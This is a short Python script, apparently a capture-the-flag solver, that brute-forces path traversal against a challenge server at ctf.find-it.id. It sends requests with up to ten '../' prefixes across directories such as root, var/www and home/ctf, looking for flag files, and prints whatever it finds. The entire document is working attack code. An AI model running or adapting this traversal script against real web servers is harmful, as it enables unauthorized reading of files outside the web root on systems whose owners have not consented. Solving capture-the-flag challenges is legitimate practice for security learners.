import requests

TARGET = "http://ctf.find-it.id:6001"
FILENAMES = ["flag", "flag.txt", ".flag", "secret.txt", "readme_flag", "this_is_the_flag_you_are_looking_for"]
PATHS = ["", ".", "app", "home/ctf", "var/www", "usr/src", "srv", "root"]
MAX_DEPTH = 10

def try_path(path):
    url = f"{TARGET}/{path}"
    print(f"[*] Trying: {url}")
    try:
        resp = requests.get(url, timeout=5)
        if "Resource not found" not in resp.text:
            print("[+] Success! Found flag:")
            print(f"URL: {url}")
            print(resp.text)
            return True
    except Exception as e:
        print(f"[!] Error: {e}")
    return False

def main():
    for depth in range(1, MAX_DEPTH + 1):
        prefix = "../" * depth
        for dir in PATHS:
            for name in FILENAMES:
                fullpath = f"{prefix}{dir}/{name}".strip("/")
                if try_path(fullpath):
                    return
    print("[-] Flag not found.")

if __name__ == "__main__":
    main()
